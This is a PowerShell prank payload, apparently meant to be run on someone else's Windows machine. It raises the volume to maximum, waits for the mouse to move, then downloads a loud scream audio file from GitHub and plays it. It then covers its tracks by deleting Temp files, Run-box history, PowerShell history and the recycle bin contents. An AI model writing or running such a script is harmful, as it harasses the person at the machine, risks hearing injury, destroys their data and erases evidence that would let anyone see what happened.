# This turns the volume up to max level
$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

# Import the System.Windows.Forms assembly
Add-Type -AssemblyName System.Windows.Forms

# Store the original position of the cursor
$originalPOS = [System.Windows.Forms.Cursor]::Position

# Loop until the cursor position changes
while (1) {
    # Check if the cursor position has changed
    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
        # If the cursor has moved, exit the loop
        break
    }
}

# At this point, the script will continue executing

# Import the System.Net and System.Media assemblies
Add-Type -AssemblyName System.Net
Add-Type -AssemblyName System.Media

# Define the URL of the .wav file to download
$url = "https://github.com/MajorMarmalade/Sounds/blob/main/hjkhjkhkhjkh-scream-(earrape)-By-Tuna.wav?raw=true"

# Download the .wav file
$client = New-Object System.Net.WebClient
$audioData = $client.DownloadData($url)

# Create a new MemoryStream to hold the audio data
$stream = New-Object System.IO.MemoryStream
$stream.Write($audioData, 0, $audioData.Length)

# Create a new SoundPlayer to play the audio data
$player = New-Object System.Media.SoundPlayer
$player.Stream = $stream

# Play the audio
$player.PlaySync()

# Dispose of the SoundPlayer and MemoryStream objects
$player.Dispose()
$stream.Dispose()


# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinu


